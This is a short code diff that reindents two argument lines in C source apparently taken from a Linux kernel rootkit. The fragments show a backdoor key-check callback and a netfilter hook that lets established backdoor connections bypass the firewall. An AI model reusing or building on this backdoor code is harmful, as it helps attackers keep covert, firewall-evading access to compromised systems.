@@ -495,7 +495,7 @@ struct check_bdkey_t {
 };
 
 static void _bdkey_callback(const u8 *const buf, size_t buflen, size_t copied,
-		     void *userdata)
+			    void *userdata)
 {
 	struct check_bdkey_t *validate = (struct check_bdkey_t *)userdata;
 	if (validate && validate->address_value) {
@@ -633,7 +633,7 @@ static unsigned int _sock_hook_nf_fw_bypass(void *priv, struct sk_buff *skb,
          * stored throughout the lifetime of the backdoor.
          */
 		if (_bd_established(&iph->daddr, dstport,
-				      (skb->sk->sk_state == TCP_ESTABLISHED))) {
+				    (skb->sk->sk_state == TCP_ESTABLISHED))) {
 			/**
              * Kick this packet out to the wire yay!
              */
